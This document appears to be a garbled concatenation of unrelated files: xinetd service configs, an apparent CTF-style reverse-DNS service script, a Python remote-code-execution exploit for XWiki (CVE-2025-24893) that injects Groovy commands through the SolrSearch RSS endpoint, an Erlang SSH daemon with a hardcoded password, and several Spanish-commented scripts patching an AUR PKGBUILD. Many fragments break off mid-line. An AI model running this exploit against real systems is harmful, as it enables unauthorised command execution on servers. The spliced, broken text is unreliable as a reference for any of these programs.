# default: off
# description: An xinetd internal service which generate characters.  The
# xinetd internal service which continuously generates characters until the
# connection is dropped.  The characters look something like this:
# !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefg
# This is the tcp version.
service chargen
{
	disable		= yes
	type		= INTERNAL
	id		= chargen-stream
	socket_type	= stream
	protocol	= tcp
	user		= root
	wait		= no
}

# This is the udp version.
service chargen
{
	disable		= yes
	type		= INTERNAL
	id		= chargen-dgram
	socket_type	= dgram
	protocol	= udp
	user		= root
	wait		= yes
}
# default: off
# description: A chargen server. This is the udp version.

service chargen
{
	type		= INTERNAL UNLISTED
	id		= chargen-dgram
	socket_type	= dgram
	protocol	= udp
	user		= root
	wait		= yes
	disable		= yes
	port		= 19
}
# default: off
# description: An internal xinetd service which gets the current system time
# then prints it out in a format like this: "Wed Nov 13 22:30:27 EST 2002".
# This is the tcp version.
service daytime
{
	disable		= yes
	type		= INTERNAL
	id		= daytime-stream
	socket_type	= stream
	protocol	= tcp

#!/bin/bash
export TERM=xterm-256color
echo "Welcome to the Reverse Resolver service..."
echo " The service will attempt to connect to $REMOTE_HOST port 60053/tcp."
echo " Once connected, a reverse dns lookup for the IP $REMOTE_HOST will be"
echo " performed. If you dont have a DNS server ready to respond, get one now..."
echo
echo "Press enter when ready..."
read

nslookup -vc -port=60053 -retry=1 -timeout=3 $REMOTE_HOST $REMOTE_HOST >/dev/null 2>&1
if [ $? -eq 0 ]; then
  REVLOOKUP=$(nslookup -vc -port=60053 -retry=1 -timeout=3 $REMOTE_HOST $REMOTE_HOST| awk -F= '{print $2}'|xargs)

import argparse
import requests
import re
from urllib.parse import urljoin, quote
import html

BANNER = """
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
"""

def extract_output(xml_text):
    decoded = html.unescape(xml_text)
    match = re.search(r"\[}}}(.*?)\]", decoded)
    if match:
        return match.group(1).strip()
    else:
        return None

def exploit(url, cmd):
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    payload = (
        "}}}"
        f"println('{cmd}'.execute().text)"
        ""
    )

    encoded_payload = quote(payload)
    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    full_url = urljoin(url, exploit_path)

    try:
        response = requests.get(full_url, headers=headers, timeout=10)
        if response.status_code == 200:
            output = extract_output(response.text)
            if output:
                print("[+] Command Output:")
                print(output)
            else:
                print("[!] Exploit sent, but output could not be extracted.")
                print("[*] Raw response (truncated):")
                print(response.text[:500])
        else:
            print(f"[-] Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")

    args = parser.parse_args()
    exploit(args.url, args.cmd)

#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.

#!/usr/bin/env bash
set -euo pipefail

PKG="xwaylandvideobridge-git"
WORK="$HOME/.local/src/$PKG"

echo "[*] Preparando entorno..."
mkdir -p "$HOME/.local/src"
rm -rf "$WORK"
git clone "https://aur.archlinux.org/${PKG}.git" "$WORK"
cd "$WORK"

# Si ya existe prepare(), no tocamos para no romper ediciones previas
if grep -qE '^[[:space:]]*prepare\(\)[[:space:]]*\{' PKGBUILD; then
  echo "[!] El PKGBUILD ya tiene prepare()."
  echo "    Abre $WORK/PKGBUILD y aplica manualmente los parches ahí."
  exit 1
fi

echo "[*] Insertando prepare() antes de build()..."

cat > /tmp/prepare_xwv.patch <<'EOF'
prepare() {
  cd "$srcdir/${pkgname%-git}"

  # 0) Info útil (por si vuelve a fallar)
  echo "[prepare] pwd=$PWD"
  echo "[prepare] CMakeLists encontrados:"
  find . -maxdepth 4 -name CMakeLists.txt -print || true

  # 1) Qt6::GuiPrivate no existe como target en tu Qt -> usar Qt6::Gui
  while IFS= read -r f; do
    if grep -q "Qt6::GuiPrivate" "$f"; then

prepare() {
  cd "$srcdir/${pkgname%-git}"

  # Info útil (si algo falla)
  echo "[prepare] pwd=$PWD"
  echo "[prepare] CMakeLists encontrados:"
  find . -maxdepth 4 -name CMakeLists.txt -print || true

  # 1) Qt6::GuiPrivate no existe como target en tu Qt -> usar Qt6::Gui
  while IFS= read -r f; do
    if grep -q "Qt6::GuiPrivate" "$f"; then
      sed -i 's/Qt6::GuiPrivate/Qt6::Gui/g' "$f"
    fi
  done < <(find . -maxdepth 4 -name CMakeLists.txt)

  # 2) Corrige include del header privado (si existe ese archivo)
  if [[ -f src/contentswindow.cpp ]]; then
    sed -i 's#<private/qtx11extras_p.h>#<QtGui/private/qtx11extras_p.h>#g' src/contentswindow.cpp
  else
    cw="$(find . -maxdepth 4 -name contentswindow.cpp | head -n 1 || true)"
    if [[ -n "$cw" ]]; then
      sed -i 's#<private/qtx11extras_p.h>#<QtGui/private/qtx11extras_p.h>#g' "$cw"
    fi

  qtpriv_core="${qtinc}/QtCore/${qtver}"

        sed -i "s#target_link_libraries[[:space:]]*( *xwaylandvideobridge#target_include_directories(xwaylandvideobridge PRIVATE ${qtpriv_gui} ${qtpriv_core})\n\ntarget_link_libraries(xwaylandvideobridge#g" "$f" || true
      fi
    fi
  done < <(find . -maxdepth 4 -name CMakeLists.txt)
}

#!/usr/bin/env bash
set -euo pipefail

PKG="xwaylandvideobridge-git"
WORK="$HOME/.local/src/$PKG"

echo "[*] Preparando entorno..."
mkdir -p "$HOME/.local/src"
rm -rf "$WORK"
git clone "https://aur.archlinux.org/${PKG}.git" "$WORK"
cd "$WORK"

echo "[*] Inyectando prepare() para parches..."

# Inserta/actualiza prepare() de forma segura
if grep -q '^prepare()' PKGBUILD; then
  echo "[!] PKGBUILD ya tiene prepare(); no lo reescribo automáticamente."
  echo "    (Si quieres, borra tu prepare() y vuelve a correr el script)"
  exit 1
fi

# Inserta prepare() justo antes de build()
perl -0777 -i -pe 's/\nbuild\(\)\s*\{\n/\nprepare() {\n  cd "$srcdir\/${pkgname%-git}"\n\n  # 1) Qt6::GuiPrivate no existe como target en tu Qt (Arch), cambia a Qt6::Gui\n  sed -i "s\/Qt6::GuiPrivate\/Qt6::Gui\/g" src\/CMakeLists.txt\n\n  # 2) Corrige include de header privado (ruta correcta en Qt6)\n  #    private\/qtx11extras_p.h  -> QtGui\/private\/qtx11extras_p.h\n  sed -i "s\/<private\/qtx11extras_p.h>\/<QtGui\/private\/qtx11extras_p.h>\/g" src\/contentswindow.cpp\n}\n\nbuild() {\n/' PKGBUILD

echo "[+] Parches agregados al PKGBUILD."
echo "[*] Compilando e instalando con makepkg..."

makepkg -si --noconfirm

echo
echo "[✓] Instalado: $PKG"
echo "    Binario:"
command -v xwaylandvideobridge || true

#!/usr/bin/env bash
set -euo pipefail

PKG="xwaylandvideobridge-git"
WORK="$HOME/.local/src/$PKG"

echo "[*] Preparando entorno..."
mkdir -p "$HOME/.local/src"
rm -rf "$WORK"
git clone "https://aur.archlinux.org/${PKG}.git" "$WORK"
cd "$WORK"

# Si ya existe prepare(), no tocamos para no romper ediciones previas
if grep -qE '^[[:space:]]*prepare\(\)[[:space:]]*\{' PKGBUILD; then
  echo "[!] El PKGBUILD ya tiene prepare()."
  echo "    Abre $WORK/PKGBUILD y aplica manualmente los parches ahí."
  exit 1
fi

echo "[*] Insertando prepare() antes de build()..."

cat > /tmp/prepare_xwv.patch <<'EOF'
prepare() {
  cd "$srcdir/${pkgname%-git}"

  # 1) En Arch/Qt6 a veces no existe el target Qt6::GuiPrivate como CMake target
  #    Así que lo cambiamos al público.
  sed -i 's/Qt6::GuiPrivate/Qt6::Gui/g' src/CMakeLists.txt

  # 2) Corrige include de header privado (Qt6 usa el prefijo QtGui/)
  sed -i 's#<private/qtx11extras_p.h>#<QtGui/private/qtx11extras_p.h>#g' src/contentswindow.cpp
}
EOF

# Inserta el bloque de prepare() justo antes de la primera ocurrencia de "build() {"
awk -v prepfile=/tmp/prepare_xwv.patch '
  BEGIN {
    inserted=0
    while ((getline line < prepfile) > 0) prep = prep line "\n"
    close(prepfile)
  }
  {
    if (!inserted && $0 ~ /^build\(\)[[:space:]]*\{/) {
      printf "%s\n", prep
      inserted=1
    }
    print
  }
  END {
    if (!inserted) {
      print "ERROR: No encontré build() en PKGBUILD" > "/dev/stderr"
      exit 2
    }
  }
' PKGBUILD > PKGBUILD.new

mv PKGBUILD.new PKGBUILD

echo "[+] prepare() insertado."
echo "[*] Compilando e instalando..."
makepkg -si --noconfirm

echo
echo "[✓] Instalado: $PKG"
command -v xwaylandvideobridge && xwaylandvideobridge --help | head -n 5 || true

prepare() {
  cd "$srcdir/${pkgname%-git}"

  # 1) Si existe un find_package(Qt6 ... COMPONENTS ...), agrega GuiPrivate si no está
  if grep -qE 'find_package\(Qt6[^)]*COMPONENTS' CMakeLists.txt; then
    grep -q "GuiPrivate" CMakeLists.txt || \
      sed -i -E 's/(find_package\(Qt6[^)]*COMPONENTS[^)]*)\)/\1 GuiPrivate)/' CMakeLists.txt
  else
    # 2) Si no hay COMPONENTS, añade un find_package extra (no rompe nada)
    grep -q "find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)" CMakeLists.txt || \
      sed -i '/find_package(Qt6/ a find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)' CMakeLists.txt
  fi

  # 3) Por si el proyecto pide GuiPrivate desde src/CMakeLists.txt (tu error viene de ahí)
  if [ -f src/CMakeLists.txt ]; then
    if grep -qE 'find_package\(Qt6[^)]*COMPONENTS' src/CMakeLists.txt; then
      grep -q "GuiPrivate" src/CMakeLists.txt || \
        sed -i -E 's/(find_package\(Qt6[^)]*COMPONENTS[^)]*)\)/\1 GuiPrivate)/' src/CMakeLists.txt
    else
      grep -q "find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)" src/CMakeLists.txt || \
        sed -i '/find_package(Qt6/ a find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)' src/CMakeLists.txt
    fi
  fi
}

# Maintainer: DawfukFR <dawfukfr@gmail.com>
# Contact: (Telegram: @Dawfuk)

pkgname=xwaylandvideobridge-git
_pkgname=xwaylandvideobridge
pkgver=0.4.0_r243.g1a8d5af
pkgrel=1
pkgdesc="A tool to make it easy to stream wayland windows and screens to Xwayland applicatons that don't have native pipewire support."
arch=(x86_64)
url='https://invent.kde.org/system/xwaylandvideobridge'
license=(GPL2)
provides=(xwaylandvideobridge)
depends=(
  glibc
  gcc-libs
  qt6-base
  qt6-declarative
  kcrash
  kcoreaddons
  ki18n
  kwindowsystem
  kpipewire
  kstatusnotifieritem
  libxcb
)
makedepends=(
  extra-cmake-modules
  kdoctools
  knotifications
  git
)
conflicts=(xwaylandvideobridge)
source=("git+https://invent.kde.org/system/xwaylandvideobridge.git")
sha256sums=('SKIP')

# Dynamically update Package Version from Git
pkgver() {
  cd ${pkgname%-git}
  _ver="$(grep -m1 'set(PROJECT_VERSION' CMakeLists.txt | cut -d '"' -f2 | tr - .)"
  echo "${_ver}_r$(git rev-list --count HEAD).g$(git rev-parse --short HEAD)"
}

build() {
  cmake -B build -S ${pkgname%-git} \
    -DBUILD_TESTING=OFF \
    -DQT_MAJOR_VERSION=6
  cmake --build build
}

# Build Package
package() {
  DESTDIR="$pkgdir" cmake --install build
}

• A unit may be statically enabled by being symlinked from another unit's

• A unit's purpose may be to act as a helper for some other unit which has

        if (not inserted) and ("find_package(Qt6 REQUIRED" in line) and ("COMPONENTS" not in line):
            out.append("find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)\n")
            inserted=True
    if not inserted:
        # Si no hay find_package(Qt6 REQUIRED) exacto, lo agregamos arriba del target_link_libraries
        for i,l in enumerate(out):
            if "target_link_libraries(" in l:
                out.insert(i, "find_package(Qt6 REQUIRED COMPONENTS GuiPrivate)\n")
                inserted=True
                break
    open(p,"w",encoding="utf-8").writelines(out)
    print("[+] Insertado find_package(Qt6 REQUIRED COMPONENTS GuiPrivate).")
PY

# 0) Requisitos básicos para compilar AUR

# 1) Descargar el PKGBUILD del AUR (NO instala todavía)
rm -rf xwaylandvideobridge
yay -G xwaylandvideobridge
cd xwaylandvideobridge

# 2) Detectar el CMakeLists (a veces está en raíz, a veces en src/)
#    y parchear: agregar "GuiPrivate" a la lista de COMPONENTS si existe.
patch_file=""
if [[ -f CMakeLists.txt ]]; then
  patch_file="CMakeLists.txt"
elif [[ -f src/CMakeLists.txt ]]; then
  patch_file="src/CMakeLists.txt"
else
  echo "No encontré CMakeLists.txt ni src/CMakeLists.txt en el directorio del PKGBUILD."
  echo "Abre el PKGBUILD y revisa dónde se extrae el source."
  exit 1
fi

echo "[+] CMakeLists detectado: $patch_file"

# 3) Inyectar un prepare() en el PKGBUILD (si no existe) y aplicar sed al archivo correcto
#    - Si ya hay prepare(), solo añadimos el sed adentro.
#    - Si no hay prepare(), lo creamos.
if grep -qE '^[[:space:]]*prepare\(\)[[:space:]]*\{' PKGBUILD; then
  echo "[+] PKGBUILD ya tiene prepare(). Insertando parche..."
  # Inserta el sed justo después del "cd" de prepare() si existe, si no, lo mete al inicio del bloque.
  perl -0777 -i -pe '
    if (s/(prepare\(\)\s*\{\s*\n)/$1  cd "$srcdir"\/\n/s) {} # no-op si no hay cd
  ' PKGBUILD

  # Insertar sed dentro del bloque prepare(), antes del cierre "}"
  perl -0777 -i -pe '
    s/(prepare\(\)\s*\{\s*\n)(.*?)(\n\})/$1$2\n  # Patch Qt6 GuiPrivate target\n  if [[ -f "$srcdir"\/xwaylandvideobridge-*\/'"$patch_file"'" ]]; then\n    sed -i '\''/find_package(Qt6[[:space:]]\\+REQUIRED[[:space:]]\\+COMPONENTS/ { /GuiPrivate/! s/)$/ GuiPrivate)/ }'\'' "$srcdir"\/xwaylandvideobridge-*\/'"$patch_file"'"\n  fi\n$3/s
  ' PKGBUILD
else
  echo "[+] PKGBUILD no tiene prepare(). Creándolo con el parche..."
  cat >> PKGBUILD <<'EOF'

prepare() {
  cd "$srcdir"/xwaylandvideobridge-*/

  # Patch Qt6 GuiPrivate target: agrega GuiPrivate a find_package(Qt6 REQUIRED COMPONENTS ...)
  if [[ -f "CMakeLists.txt" ]]; then
    sed -i '/find_package(Qt6[[:space:]]\+REQUIRED[[:space:]]\+COMPONENTS/ { /GuiPrivate/! s/)$/ GuiPrivate)/ }' CMakeLists.txt
  elif [[ -f "src/CMakeLists.txt" ]]; then
    sed -i '/find_package(Qt6[[:space:]]\+REQUIRED[[:space:]]\+COMPONENTS/ { /GuiPrivate/! s/)$/ GuiPrivate)/ }' src/CMakeLists.txt
  fi
}
EOF
fi

# 4) Compilar e instalar
makepkg -si --noconfirm
